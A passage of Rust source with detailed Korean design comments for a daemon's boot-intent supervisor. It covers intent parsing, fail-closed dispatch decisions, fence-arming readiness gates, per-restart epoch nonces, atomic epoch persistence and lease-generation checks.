    /// ★현재 이 값의 **소비자는 아직 없다**(감독자 dispatch 는 읽지 않는다) — 읽을 주체가
    /// §2-7 러너(B4)다. 그러니 지금 이 재스냅샷은 B4 가 그 값을 신뢰하기 전에 기록을 정직하게
    /// 만들어 두는 일이다.
    pub executor: String,
    /// (v3) lease 세대. 디스패치마다 +1 되며 side-effect RPC 의 CAS 근거다(명세 §2-6).
    pub generation: u32,
    /// (v3) 수명 상태.
    pub state: IntentState,
    /// (v3) 종착(있으면). `state == Terminal` 일 때만 채워진다.
    pub terminal: Option<Terminal>,
}

impl BootIntent {
    fn to_value(&self) -> serde_json::Value {
        json!({
            "v": self.v,
            "action": self.action_token,
            "lane": self.lane,
            "surface_id": self.surface_id,
            "created_at": self.created_at,
            "attempts": self.attempts,
            "next_attempt_at": self.next_attempt_at,
            "reason": self.reason,
            "decl_origin": self.decl_origin,
            "claim": {"rc": self.claim_rc, "at": self.claim_at},
            // (v3) 추가-only — 구 판독자는 미지 키를 무시한다(`from_str` 은 알려진 키만 본다).
            "decl_id": self.decl_id,
            "executor": self.executor,
            "generation": self.generation,
            "state": self.state.as_str(),
            "terminal": self.terminal.as_ref().map(|t| t.to_value()),
        })
    }

    /// 파일 본문 → 인텐트. **형상이 틀리면 `None`** 이고 호출부는 폐기한다(조용한 기본값
    /// 채우기 금지 — 기본값으로 채우면 깨진 인텐트가 정상처럼 실행된다).
    fn from_str(id: &str, body: &str) -> Option<Self> {
        let v: serde_json::Value = serde_json::from_str(body).ok()?;
        let obj = v.as_object()?;
        Some(BootIntent {
            id: id.to_string(),
            v: obj.get("v")?.as_u64()?,
            action_token: obj.get("action")?.as_str()?.to_string(),
            lane: obj
                .get("lane")
                .and_then(|x| x.as_str())
                .unwrap_or_default()
                .to_string(),
            surface_id: obj.get("surface_id").and_then(|x| x.as_u64()),
            created_at: obj.get("created_at").and_then(|x| x.as_f64()).unwrap_or(0.0),
            // 폭 변환은 **클램프**다(governance.rs `clamp_env_u32` 와 같은 규율) — `as` 는
            // wrap 이라 거대 `attempts` 가 0·1 로 되접히면 예산 축이 통째로 뒤집힌다.
            // 거대값 → `u32::MAX` → `attempts_exhausted` 폐기 = 보수적 방향.
            attempts: u32::try_from(obj.get("attempts").and_then(|x| x.as_u64()).unwrap_or(0))
                .unwrap_or(u32::MAX),
            next_attempt_at: obj
                .get("next_attempt_at")
                .and_then(|x| x.as_f64())
                .unwrap_or(0.0),
            reason: obj
                .get("reason")
                .and_then(|x| x.as_str())
                .unwrap_or_default()
                .to_string(),
            // (v2) 알려진 키만 판독 — 부재는 빈 값/None(구 v1 파일 하위호환 판독. 단 v1 은
            // decide() 의 버전 판정에서 어차피 schema_mismatch 로 폐기된다).
            decl_origin: obj
                .get("decl_origin")
                .and_then(|x| x.as_str())
                .unwrap_or_default()
                .to_string(),
            claim_rc: obj.get("claim").and_then(|c| c.get("rc")).and_then(|x| x.as_i64()),
            claim_at: obj.get("claim").and_then(|c| c.get("at")).and_then(|x| x.as_f64()),
            // ── (v3) 승격 판독(명세 §2-5 · §5) ────────────────────────────────────
            // 구 스키마(v2) 파일에는 이 키들이 없다. **폐기가 아니라 기본값 승격**이다 —
            // 업그레이드 순간에 대기 중이던 오너 선언을 죽이지 않기 위해서다.
            //   · decl_id 부재 → 파일명(id). 그 파일의 유일 식별자는 이름이다.
            //   · executor 부재 → 빈 값. 디스패치 시점에 감독자가 스위치 값으로 채운다
            //     (여기서 env 를 읽지 않는 이유: `from_str` 이 순수해야 진리표로 시험된다).
            //   · state 부재/미지 → pending(가장 보수적 — 실행 전으로 본다).
            //   · terminal 형상 불량 → None(있다고 거짓말하지 않는다).
            decl_id: obj.get("decl_id").and_then(|x| x.as_str())
                .filter(|x| !x.is_empty()).unwrap_or(id).to_string(),
            executor: obj.get("executor").and_then(|x| x.as_str()).unwrap_or_default().to_string(),
            generation: u32::try_from(obj.get("generation").and_then(|x| x.as_u64()).unwrap_or(0))
                .unwrap_or(u32::MAX),
            state: obj.get("state").and_then(|x| x.as_str()).and_then(IntentState::parse)
                .unwrap_or(IntentState::Pending),
            terminal: obj.get("terminal").and_then(Terminal::from_value),
        })
    }
}

/// **디스크측 예산과 메모리측 예산의 합류** — 큰 쪽이 이긴다.
///
/// 왜 필요한가: 스풀이 읽기전용이 되거나 디스크가 만실이면 `attempts` 증가가 **영원히
/// 실패**한다. 그러면 파일만 보는 판정은 매 쿨다운마다 새로 시도해 프로세스를 무한히 낳는다
/// (치명위험 ① 그 자체). 태스크 로컬 예산은 디스크가 거짓말해도 **혼자서** 유계를 성립시킨다.
pub fn effective_attempts(file_attempts: u32, mem_attempts: u32) -> u32 {
    file_attempts.max(mem_attempts)
}

/// 인텐트 1건의 **순수 판정**. 디스크도 데몬도 보지 않는다 — 그래서 진리표로 전수 시험된다.
///
/// 순서가 곧 우선순위다: 형상 → 미지 토큰 → 만료 → 예산 소진 → 쿨다운 → 실행.
/// (만료를 예산보다 **앞**에 두는 이유: 30분 지난 인텐트는 예산이 남아 있어도 실행 대상이
/// 아니다. 반대로 두면 늙은 인텐트가 예산을 태우며 3번 더 프로세스를 낳는다.)
pub fn decide(it: &BootIntent, attempts: u32, now: f64) -> Disposition {
    // (v3 · 명세 §5) **승격 판독** — 현행(3)과 구 스키마(2)를 모두 받는다. 구 데몬이 남긴
    // 인텐트를 폐기하면 업그레이드 순간에 대기 중이던 오너 선언이 죽는다. 반대 방향(미래
    // 스키마·v1 이하)은 여전히 fail-closed 다 — 모르는 형상을 실행하지 않는다.
    if it.v != INTENT_SCHEMA_V && it.v != INTENT_SCHEMA_V_LEGACY {
        return Disposition::Retire("schema_mismatch");
    }
    // (v3) 이미 닫힌 인텐트는 실행 후보가 아니다 — GC 가 `.done` 을 걷어갈 때까지 남아 있어도
    // 다시 낳지 않는다(종전엔 '파일 존재 = 대기' 라 이 상태가 표현되지 않았다).
    if it.state == IntentState::Terminal {
        return Disposition::Retire("already_terminal");
    }
    let Some(action) = BootAction::parse(&it.action_token) else {
        // ★여기가 '명령 문자열 없음' 계약의 집행 지점이다. 미지 토큰은 실행 후보가 아니라
        //   폐기 대상이다 — 이 분기를 지우면 스풀이 곧 명령 실행 표면이 된다.
        return Disposition::Retire("unknown_action");
    };
    // (P2 · v2) decl_origin 도 닫힌 토큰이다 — 인정 토큰은 hook-human 하나뿐이고 미지값은
    // 실행이 아니라 폐기다. 정상 경로의 유일 writer(boot.enqueue arm)는 미지값을 애초에
    // 거절하므로, 여기 도달하는 미지값은 스풀 직접 투하(§4-10 잔여위험 계급)다 — fail-closed.
    if !it.decl_origin.is_empty()
        && it.decl_origin != DECL_ORIGIN_HOOK_HUMAN
        && it.decl_origin != DECL_ORIGIN_GUI_OPERATOR
    {
        return Disposition::Retire("unknown_decl_origin");
    }
    if now - it.created_at > INTENT_MAX_AGE_SECS {
        return Disposition::Retire("expired");
    }
    if attempts >= MAX_ATTEMPTS {
        return Disposition::Retire("attempts_exhausted");
    }
    if now < it.next_attempt_at {
        return Disposition::Wait {
            until: it.next_attempt_at,
        };
    }
    // ★B3(명세 §2-6): `running` 은 **러너가 소유**한다 — 감독자는 재디스패치하지 않는다.
    //   종전엔 성공 디스패치가 파일을 지웠으므로 이 상태가 스풀에 존재할 수 없었다. 이제
    //   남으므로, 이 게이트가 없으면 다음 틱이 같은 인텐트를 **또 낳는다**(폭주 = 치명위험 ①).
    //   ★현재 해제 조건은 위의 수명 상한(`expired` · [`INTENT_MAX_AGE_SECS`]) 하나다. hb 정지·
    //   progress 불변·절대 마감으로 정밀화하는 것이 fence(§2-6)이고 **B3 다음 단위**다 —
    //   그때까지 죽은 러너의 인텐트는 최대 수명만큼 남는다(유계 · 조용하지 않다: 같은 좌석의
    //   새 선언은 `superseded` 로 **기록+처방**이 나간다).
    if it.state == IntentState::Running {
        return Disposition::Wait {
            until: it.next_attempt_at,
        };
    }
    Disposition::Run(action)
}

/// (B3 · 명세 §2-6 ⓐ) 러너 생존 신고가 끊긴 것으로 보는 한계.
///
/// **명세 리터럴이다** — 유도가 아니다(W-A 가 명세 원문 §2-6 을 확인했다). python 의
/// `BOOT_NODE_TOTAL_S` 도 90 이지만 명세가 그 leaf 를 보고 썼다는 근거는 없으므로 **없는 계보를
/// 지어내지 않는다**. 값의 소유자는 python 의 `BOOT_HB_STALL_S` 이고 예산 파리티가 대조한다.
pub const HB_STALL_SECS: f64 = 90.0;

/// (B3-3 · 명세 §2-6 ⓑ) 러너가 **같은 단계에 머물러 있는** 것으로 보는 한계.
///
/// ## 왜 126 인가 — 지어낸 숫자가 아니라 python 파생값의 사본이다
/// 값의 소유자는 python `javis_budget.boot_node_outer_s()` 다(= `boot_node_inner_worst_s()` +
/// 마진 · 실측 126). 한 노드가 자기 **outer 예산을 꽉 써도** fence 되면 안 되므로 그 축의 상한을
/// 쓴다 — `BOOT_NODE_TOTAL_S`(90)나 inner(105)로 내리면 **경계에서 건강한 런을 자른다**. leaf 가
/// 커지면 이 임계도 함께 커져야 하고, 그 드리프트는 예산 파리티 핀(H-TIME-1 ⓓ ·
/// `RUST_PARITY_CONSTS["PROGRESS_STALL_SECS"]`)이 잡는다. W-A 가 이 상수보다 **먼저** 핀을
/// 등재해 뒀으므로(선등재) 이 줄은 태어나는 순간부터 대조를 받는다 — 드리프트가 생길 창이 없다.
///
/// ## 정직 고지 — 이것은 T3-3 의 런타임 판독이 아니다
/// 시뮬 T3-3 은 단계 예산 SOT 를 `cys budget --json` 으로 **런타임 판독**하라고 적는다. 그 판독의
/// 주체는 §2-7 러너(B4)다. 감독자는 매 틱 도는 경로라 여기서 python 을 부르면 틱 길이가 외부
/// 프로세스에 묶인다(유계 상실). 그래서 감독자는 컴파일 타임 상수를 쓰고, python 과의 정합은
/// 위 파리티 핀이 지킨다 — 판독 위치는 다르되 **SOT 는 하나**다.
pub const PROGRESS_STALL_SECS: f64 = 126.0;

/// (R3 #7 · codex BLOCK · master 심판) **fence 무장 스위치 — 기본 꺼짐.**
///
/// ## 왜 스위치가 필요한가
/// fence 의 안전성은 "세대가 오르면 구 러너의 side-effect RPC 가 전부 거절된다"에 **전적으로**
/// 기댄다. 그런데 그 거절을 집행하는 주체(§2-7 러너의 CAS·자멸)가 **아직 없다**(B4). 그 전에
/// 세대만 올리면 우리는 '무해해졌다' 고 믿으면서 실제로는 아무것도 막지 못한 채 표와 파일만
/// 흔드는 셈이다 — TOCTOU·ABA·admission 부정확이 그 창에서 **실제 위험**이 된다.
///
/// 그래서 '아직 발효하지 않는다' 를 주석이 아니라 **코드 게이트**로 세운다. 꺼져 있으면
/// **판정·세대 상승·재개가 전부 금지**된다. 켜는 조건은 B4 의 RPC CAS 계약과 그 검체가 닫히는
/// 것이고, 그때 이 상수 하나만 뒤집으면 경로 전체가 살아난다.
///
/// ★종전(B3-2R-1)에는 `hb <= started` 라는 **데이터 조건**이 사실상 같은 역할을 했다. 그러나
/// 데이터 조건은 데이터가 바뀌면 조용히 열린다 — 러너가 hb 를 한 번이라도 쓰기 시작하는 순간
/// 무장 여부와 무관하게 fence 가 살아난다. 게이트는 그 우연을 막는다(codex #7 의 요지다).
pub const ENV_FENCE_ARMED: &str = "CYS_FENCE_ARMED";

/// (R4 [4]) **러너 계약 준비도** — 이 빌드가 fence 를 감당할 수 있는가.
///
/// ## 왜 env 스위치만으로는 부족한가 (codex [4] · gemini 가 놓친 지점 · master 심판)
/// [`ENV_FENCE_ARMED`] 하나로 arm 된다면, CAS 폐쇄면도 자가종료도 없는 빌드에서 **환경변수를
/// 켜는 것만으로** fence 가 살아난다. 그때 세대를 올려봐야 그 거절을 집행할 주체가 없으므로
/// 우리는 '무해해졌다' 고 믿으면서 실제로는 아무것도 막지 못한 채 표와 파일만 흔든다.
/// 스위치는 **의도**를 나타내고 준비도는 **능력**을 나타낸다 — 다른 사실이므로 AND 여야 한다.
///
/// ## 왜 bool 하나가 아니라 여덟 칸인가
/// `ready == false` 만 남으면 **무엇이 없어서 못 켜는지** 알 수 없고, 그 상태는 판독자에게
/// '아직 안 됨' 과 '고장' 을 같아 보이게 한다(이 저장소가 PEND 사유 계약에서 이미 값을 치른
/// 계급이다). 여덟 칸은 codex 가 지목한 목록 그대로이고(R3 여섯 + R5 [5] 둘), B4 가 하나씩
/// 착지시킬 때마다 그
/// 칸만 뒤집는다 — 무엇이 남았는지가 항상 [`RunnerReadiness::missing`] 으로 화면에 있다.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct RunnerReadiness {
    /// §2-7 러너의 side-effect RPC 가 lease 로 CAS 되어 구 세대를 **실제로 거절**하는가.
    pub lease_cas_closed: bool,
    /// terminal 기록과 표 갱신이 **원자 handler** 안에서 함께 일어나는가.
    pub atomic_handler: bool,
    /// epoch 가 러너까지 **전달되어** lease identity 에 실리는가.
    pub epoch_propagated: bool,
    /// 세대가 밀린 러너가 **스스로 종료**하는가(무kill 계약에서 회수의 유일한 주체다).
    pub self_terminate: bool,
    /// boot-last **골든 writer** 가 실재하는가.
    pub boot_last_writer: bool,
    /// fence 고아 원장이 **영속**되어 재시작을 넘는가(R3 #9).
    pub durable_history: bool,
    /// (R5 [5]) admission **active map 원자 예약**이 구현·검증됐는가(A18 [2]).
    ///
    /// 이 칸이 없으면 '예약 없이 낳는' 빌드에서도 arm 될 수 있었다 — 그 창에서 fence 는
    /// 유계를 세지 못한 채 세대만 올린다.
    pub admission_reserved: bool,
    /// (R5 [5]) 러너의 **확인된 exit** 을 관측·기록하는가(A18 [5]).
    ///
    /// 고아 회수의 **유일한 근거**다(나이는 추정이라 근거가 아니다 — R5 [4]). 이 칸이 false 인
    /// 동안 원장은 자라기만 하므로, 그 상태에서 arm 되면 상한이 차고 부트가 멎는다. 그래서
    /// 회수 주체가 없으면 애초에 무장하지 못하게 막는다.
    pub confirmed_exit_observed: bool,
}

impl RunnerReadiness {
    /// 여덟이 **전부** 참일 때만 준비됐다. 하나라도 비면 fence 는 막는 것 없이 표만 흔든다.
    ///
    /// ★(R6 [1] · IG-28) 이 칸들은 '그렇게 되기를 바란다' 가 아니라 **'빌드에 실재한다' 는
    /// 주장**이다. 그래서 주장이 빌드를 앞지를 수 없게 소스핀이 증거 마커를 요구한다 —
    /// `admission_reserved` 는 `reserve_admission(`, `confirmed_exit_observed` 는
    /// `release_confirmed_exit(` 가 생산 코드에 실재해야 true 가 될 수 있다(B4 가 그 이름으로
    /// 착지시키거나, 다른 이름을 쓰면 핀을 함께 고친다 — 어느 쪽이든 **눈에 보이는 결박**이다).
    pub const fn ready(&self) -> bool {
        self.lease_cas_closed
            && self.atomic_handler
            && self.epoch_propagated
            && self.self_terminate
            && self.boot_last_writer
            && self.durable_history
            && self.admission_reserved
            && self.confirmed_exit_observed
    }

    /// 빠진 칸의 이름 — **왜** 못 켜는지 사람과 이벤트가 함께 읽는다.
    pub fn missing(&self) -> Vec<&'static str> {
        [
            (self.lease_cas_closed, "lease_cas_closed"),
            (self.atomic_handler, "atomic_handler"),
            (self.epoch_propagated, "epoch_propagated"),
            (self.self_terminate, "self_terminate"),
            (self.boot_last_writer, "boot_last_writer"),
            (self.durable_history, "durable_history"),
            (self.admission_reserved, "admission_reserved"),
            (self.confirmed_exit_observed, "confirmed_exit_observed"),
        ]
        .into_iter()
        .filter(|(ok, _)| !ok)
        .map(|(_, name)| name)
        .collect()
    }
}

/// **이 빌드의 준비도 — 지금은 전부 false 다.**
///
/// B4 가 각 계약을 착지시키면서 그 칸을 하나씩 뒤집는다. 한꺼번에 true 로 바꾸지 마라 —
/// 이 상수의 값은 '그렇게 되기를 바란다' 가 아니라 '빌드와 검체에 실재한다' 는 주장이다.
pub const RUNNER_READINESS: RunnerReadiness = RunnerReadiness {
    lease_cas_closed: false,
    atomic_handler: false,
    epoch_propagated: false,
    self_terminate: false,
    boot_last_writer: false,
    durable_history: false,
    admission_reserved: false,
    confirmed_exit_observed: false,
};

/// [`ENV_FENCE_ARMED`] 판독 — env 가 무장을 **요구**하는가(의도 축 하나만 본다).
/// 켜는 쪽만 명시적이어야 한다: 오타 하나로 위험한 경로가 열리면 안 된다.
pub fn env_asks_arm(env_val: Option<&str>) -> bool {
    matches!(env_val.map(str::trim), Some("1") | Some("true"))
}

/// (R4 [4]) 최종 무장 판정 — **의도 AND 능력**. 어느 한쪽만으로는 절대 켜지지 않는다.
pub fn fence_armed_from(env_val: Option<&str>, readiness: RunnerReadiness) -> bool {
    readiness.ready() && env_asks_arm(env_val)
}

/// (R4 [1]) epoch 후보 하나 — **비교가 아니라 동등성으로만** 쓰이는 식별자다(실측: 이 저장소
/// 어디에도 epoch 에 대한 대소 비교가 없다).
///
/// ## 왜 카운터가 아닌가 — 종전 read-modify-write 의 두 결함
///  ⓐ `saturating_add` 는 천장에서 **멈춘다**. 그 뒤로는 모든 재시작이 같은 값을 돌려주어
///    epoch 가 존재 이유(재시작 간 ABA 차단)를 **조용히** 잃는다 — 값을 올리는 코드가 값을
///    올리지 않는 순간이 있는데 아무도 알지 못한다. 실패가 침묵하는 형태라 가장 나쁘다.
///  ⓑ RMW 는 프로세스 간 잠금을 요구한다. unix 에서는 데몬 startup flock(`main.rs`
///    `acquire_startup_lock`)이 그것을 이미 주지만 **그 함수는 `#[cfg(unix)]` 라 Windows 에는
///    없다** — 거기서는 동시에 뜬 두 데몬이 같은 이전 값을 읽어 같은 다음 값을 쓴다.
///
/// nonce 는 둘 다 **구조적으로** 없앤다: 더하지 않으므로 넘칠 수 없고, 판정이 읽기-쓰기 경주에
/// 걸리지 않으므로 잠금이 필요 없다(같은 순간에 떠도 pid 가 다르면 값이 다르다).
///
/// ## 정직 고지 — 이 값은 비밀이 아니다
/// 암호학적 원천이 아니다(시계·pid·프로세스 내 카운터의 혼합 · `lib.rs` `tmp_suffix` 와 같은
/// 관용구). epoch 는 **식별자**이고 인가는 좌석 토큰이 진다. 이 값을 비밀로 쓰려는 코드가
/// 생기면 그때는 원천부터 바꿔야 한다 — 여기서 조용히 겸직시키지 마라.
fn epoch_nonce() -> u64 {
    use std::sync::atomic::AtomicU64;
    static SEQ: AtomicU64 = AtomicU64::new(0);
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::SystemTime::UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(0);
    let seq = SEQ.fetch_add(1, Ordering::Relaxed);
    nanos
        .wrapping_mul(6364136223846793005)
        .wrapping_add(seq.wrapping_mul(1442695040888963407))
        .wrapping_add(u64::from(std::process::id()))
}

/// 직전 값과 우연히 겹쳤을 때 다시 뽑는 횟수. 이것은 **쓰기 재시도가 아니라 이름 뽑기**다.
const NONCE_TRIES: usize = 8;

/// (R3 #2 · R4 [1]) **재시작마다 유일한 영속 epoch** 를 정하고 **디스크에 내린 뒤** 돌려준다.
///
/// generation 만으로는 ABA 를 막지 못한다: 데몬이 재시작하면 인메모리 표가 비고 세대가 되감길
/// 수 있어, 옛 러너가 든 (intent, generation) 이 새 런의 그것과 **우연히 같아질** 수 있다.
/// epoch 를 lease identity 에 넣으면 그 재사용이 끊긴다.
///
/// ## 왜 `Result` 인가 — 못 남겼으면 열지 않는다
/// 종전은 `let _ = std::fs::write(..)` 로 **영속 실패를 삼켰다**. 그러면 디스크에 아무것도 없는
/// 채로 감독자가 열리고, 다음 재시작은 '이전 값' 을 모르므로 재사용 방지가 사라진다 — lease
/// identity 가 근거 없이 발급된다. 이제 실패는 `Err` 로 나가고, 호출부([`spawn`])는 그 경우
/// **감독자를 열지 않는다**(`supervisor_alive` 미set → 훅이 legacy 폴백을 탄다). 이 모듈이
/// 이미 여러 곳에서 쓰는 규율 그대로다: 못 남기면 낳지 않는다.
///
/// ## 판독은 조언적이다(쓰기와 계급이 다르다)
/// 이전 값 판독은 **직전과 같은 nonce 를 피하는 데만** 쓴다. 못 읽어도 진행한다 — '읽을 수
/// 없다' 와 '첫 기동이라 없다' 는 구별되지 않고, 거기서 멈추면 파일 하나가 부트를 영구히
/// 막는다. 반면 **쓰기 실패는 진행을 막는다**(위 문단).
pub fn bump_boot_epoch(dir: &Path) -> Result<u64, String> {
    let p = dir.join("boot-epoch");
    let prev = std::fs::read_to_string(&p)
        .ok()
        .and_then(|s| s.trim().parse::<u64>().ok());
    let mut next = epoch_nonce();
    for _ in 0..NONCE_TRIES {
        if Some(next) != prev {
            break;
        }
        next = epoch_nonce();
    }
    if Some(next) == prev {
        // 시계가 멎고 카운터도 안 돌면 여기 온다 — 그때 같은 값을 쓰는 것은 재사용 방지를
        // 끄는 것과 같으므로 열지 않는다.
        return Err("epoch nonce 가 직전 값과 계속 같다(시계 정지 의심)".to_string());
    }
    persist_epoch(&p, next).map_err(|e| format!("epoch 영속 실패({}): {e}", p.display()))?;
    Ok(next)
}

/// epoch 를 **원자 교체 + fsync** 로 내린다 — rename 만으로는 크래시를 못 넘는다.
///
/// ## Windows 도 replace-safe 다 — 추정이 아니라 실측이다 (R5 [3])
/// `std::fs::rename` 은 Windows 에서 **기존 목적지를 덮어쓴다**. 근거는 표준 라이브러리 소스다:
/// `library/std/src/sys/fs/windows.rs` 의 `rename` 이
/// `MoveFileExW(old, new, MOVEFILE_REPLACE_EXISTING)` 를 부르고, `ACCESS_DENIED` 면
/// `SetFileInformationByHandle`/`FileRenameInfoEx` 로 폴백한다. 동시 기동도 막히지 않는다 —
/// 같은 파일의 기본 `share_mode` 가 `FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE`
/// 라, 다른 데몬이 이 파일을 **읽는 중이어도** 그 핸들이 rename 을 막지 않는다.
///
/// ★그러므로 "Windows 는 덮어쓰기 rename 이 안 된다" 는 통념으로 **목적지를 먼저 지우고
/// rename 하는 수정을 하지 마라.** 그 순간 원자성이 깨진다: 목적지가 잠깐 사라지고, 그 창에서
/// 크래시하면 epoch 를 통째로 잃는다(다음 기동이 이전 값을 몰라 재사용 방지가 사라진다).
/// 아래 소스핀이 그 회귀를 막는다.
///
/// ★정직한 잔여: 디렉터리 fsync 는 `#[cfg(unix)]` 라 Windows 에서는 건너뛴다(이식 가능한
/// 대응물이 없다). 파일 **내용**은 `sync_all`(FlushFileBuffers)로 이미 매체에 있다.
///
/// 순서가 계약이다: tmp 에 쓰고 → `sync_all`(바이트가 실제로 매체에 있다) → rename(원자 교체).
/// fsync 를 건너뛰면 rename 은 성공했는데 내용이 0바이트인 파일이 남을 수 있고, 그러면 다음
/// 기동의 판독이 조용히 실패해 재사용 방지가 사라진다. tmp 이름은 nonce 라 **호출마다 유일**
/// 하고(`create_new` = O_EXCL 이 커널 수준으로 보증한다), 어느 경로로 빠져나가든 자기 것만 치운다.
fn persist_epoch(path: &Path, value: u64) -> std::io::Result<()> {
    use std::io::Write;
    if let Some(d) = path.parent() {
        std::fs::create_dir_all(d)?;
    }
    let tmp = path.with_extension(format!("tmp-{:x}", epoch_nonce()));
    let mut f = std::fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .open(&tmp)?;
    if let Err(e) = f.write_all(value.to_string().as_bytes()).and_then(|()| f.sync_all()) {
        drop(f);
        let _ = std::fs::remove_file(&tmp);
        return Err(e);
    }
    drop(f); // Windows: 열린 핸들이 있으면 rename 이 공유위반으로 막힌다.
    if let Err(e) = std::fs::rename(&tmp, path) {
        let _ = std::fs::remove_file(&tmp);
        return Err(e);
    }
    // 디렉터리 엔트리까지 내려야 rename 자체가 크래시를 넘는다. 실패는 치명이 아니다 —
    // 파일 내용은 이미 매체에 있고, 여기서 막으면 얻는 것보다 잃는 것이 크다(최선 노력).
    #[cfg(unix)]
    if let Some(d) = path.parent() {
        let _ = std::fs::File::open(d).and_then(|df| df.sync_all());
    }
    Ok(())
}

/// (B3-2R ④ⓓ) **전역 동시 런 상한** — 살아 있는 런 + 회수하지 못한 fence 고아의 합.
///
/// 왜 필요한가(codex④): [`MAX_ATTEMPTS`] 는 **인텐트별** 예산이라, 선언이 계속 쌓이면 전역
/// 프로세스 총량은 유계가 아니다. 무kill 계약에서 fence 는 소유권만 회수하고 프로세스는 남길
/// 수 있으므로 그 고아가 누적된다.
///
/// 값은 [`MAX_ATTEMPTS`] 에서 **유도**한다(임의의 새 숫자를 고르지 않는다): 한 인텐트가 fence
/// 될 수 있는 횟수가 그 값이고 그만큼 쌓이면 그 인텐트는 어차피 소진된다. 여기에 현재 실행
/// 중인 1을 더한다.
const MAX_LIVE_BOOT_RUNS: usize = MAX_ATTEMPTS as usize + 1;

/// (B3-2R ④ⓓ → R5 [4] 개정) fence 고아를 **오래 쥐고 있다**고 보는 나이 — **진단 임계**다.
///
/// ★R5 [4](codex · master 심판): 종전에는 이 나이를 넘긴 고아를 **지웠다**. 그 삭제는 관측이
/// 아니라 추정이었고, 추정으로 지우면 **살아 있는 러너를 없는 것으로 세어 새 런을 낳는 문**이
/// 열린다. 그래서 나이 기반 삭제는 armed 여부와 무관하게 **폐지**했다. 원장에서 빼는 유일한
/// 근거는 **확인된 exit 관측**이다(A18 [5] · B4 · [`RunnerReadiness::confirmed_exit_observed`]).
///
/// ★영구 정지 우려는 사슬로 닫힌다: 미무장이면 fence 가 원장에 아무것도 넣지 않아 원장이 애초에
/// 비어 있고, 무장은 readiness 8칸이 막으며, 무장이 열리는 시점에는 `confirmed_exit_observed`
/// 가 참이므로 회수 경로가 이미 존재한다. 값은 여전히 [`INTENT_MAX_AGE_SECS`] 유도다(예산 파리티
/// 유도식 핀이 그 관계를 지킨다) — 의미만 '삭제 나이' 에서 '보고 임계' 로 바뀌었다.
const FENCED_REAP_AGE_SECS: f64 = INTENT_MAX_AGE_SECS;

/// ★B3(§2-6) fence 판정 — **순수 함수**. 이 런의 소유권(lease)을 회수해야 하는가.
///
/// ## 발효 조건이 하나 더 있다 — 미보고 런은 fence 하지 않는다
/// `hb <= started` 는 "**한 번도 보고하지 않았다**"는 뜻이다. 그때 '러너가 죽었다'와 'hb 배선이
/// 아직 없다'는 **구별되지 않는다** — 현행 실행자([`run_ensure_team`])는 python 부트 체인을
/// 낳고 hb 를 보고하지 않으며, 보고하는 주체는 §2-7 러너(B4)다. 구별 못 하는 신호로 파괴적
/// 조치를 하면 **건강한 부트를 다시 낳는다**(이 저장소가 반복해서 맞은 계급이다).
///
/// 그래서 지금 이 함수는 프로덕션에서 **사실상 발효하지 않는다**. 그 미발효는 조용하지 않다 —
/// 아래 검체가 두 갈래를 모두 단언하고, B4 가 hb 를 배선하는 순간 **코드 변경 없이** 발효된다.
/// 그때까지의 안전망은 인텐트 수명([`INTENT_MAX_AGE_SECS`])이다.
///
/// ⓑ progress 정체·ⓒ 절대 마감은 값이 예산 leaf(`javis_budget.bootstrap_chain_worst_s`)라
/// `cys budget --json` 배선(T3-3)과 **같은 단위**에 들어간다 — 여기서 숫자를 지어내지 않는다.
/// ★B3-2R ③(codex③) fence 의 **CAS 술어** — 디스크의 현재 형상이 기대와 같은가.
///
/// 스캔은 스냅샷이라 판정과 쓰기 사이에 디스크가 움직일 수 있다: 러너가 terminal 을 기록했거나
/// 다른 세대가 착지했을 수 있다. 그대로 세대를 올리면 **완료된 런을 fence 해** 이중 재개의 문이
/// 열린다(terminal 완료와 fence 가 겹치는 자리 · 합산 계약 ③).
///
/// 판독 실패(`None`)도 **불일치**다 — 읽을 수 없는 파일에 대해 기대 상태를 가정하지 않는다.
/// 순수 함수인 이유: 배선 안에서는 이 갈래에 결정론으로 도달시킬 방법이 없어 검체가 공허해진다
/// (실측으로 확인했다 — 표·스냅샷 세대가 이미 일치해야 판정이 나므로 그때 디스크만 따로 움직이는
/// 상태를 틱 밖에서 만들 수 없다). 그래서 **판정을 값으로 뽑아** 직접 잰다.
/// (B3-4 · T3-1 · 명세 §2-7) **선택적 lease 검증** — 실려 왔을 때만 잰다.
///
/// ## 왜 선택적인가 — 추가만 하고 종전을 막지 않는다
/// `surface.create`·`directive.verify` 는 러너만 부르지 않는다(사람·GUI·다른 노드도 부른다).
/// 그들은 lease 를 모르므로 필수로 만들면 종전 경로가 전부 막힌다. 그래서 없으면 종전 그대로
/// 통과시키고, **실려 왔을 때만** 현재 소유권과 대조한다.
///
/// ## 이것이 막는 것 — fence 직후의 구 러너
/// 감독자가 fence 로 세대를 올린 직후, 구 러너가 보낸 `surface.create{lease: 옛 세대}` 가 뒤늦게
/// 도착할 수 있다. 그 요청을 그대로 처리하면 fence 가 회수했다고 믿은 소유권이 실제로는 계속
/// 쓰이는 것이다 — fence 의 안전성이 전적으로 기대는 그 CAS 거절이 여기서 집행된다.
///
/// ## 정직한 한계 — generation 만으로는 재시작을 넘지 못한다
/// 데몬이 재시작하면 표가 비고 세대가 되감길 수 있어, 옛 러너가 든 generation 이 새 런의 그것과
/// **우연히 같아질** 수 있다(ABA). 그것을 가르는 축은 epoch 이고, epoch 를 러너까지 실어 보내는
/// 것은 §2-7 러너(B4 · [`RunnerReadiness::epoch_propagated`])다. 그때 이 술어에 축 하나를 더하면
/// 닫힌다 — 지금 재는 것은 **같은 데몬 수명 안에서의** 세대 경합이고, 그 범위를 넘겨 주장하지
/// 않는다.
pub fn lease_ok(supplied: Option<u64>, active: Option<&BootRunActive>) -> bool {
    match supplied {
        // 미제출 = 종전 경로. 검사하지 않는 것과 통과시키는 것은 다르지만, 여기서는 같게 둔다
        // (추가만 한다는 계약이 그것이다).
        None => true,
        Some(g) => active.is_some_and(|r| u64::from(r.generation) == g),
    }
}

pub fn fence_cas_ok(fresh: Option<&BootIntent>, expected_generation: u32) -> bool {
    fresh.is_some_and(|f| {
        f.state == IntentState::Running && f.generation == expected_generation
    })
}

pub fn fence_verdict(run: &BootRunActive, now: f64) -> Option<&'static str> {
    if run.hb <= run.started {
        return None;
    }
    if now - run.hb > HB_STALL_SECS {
        return Some("hb_stall");
    }
    None
}

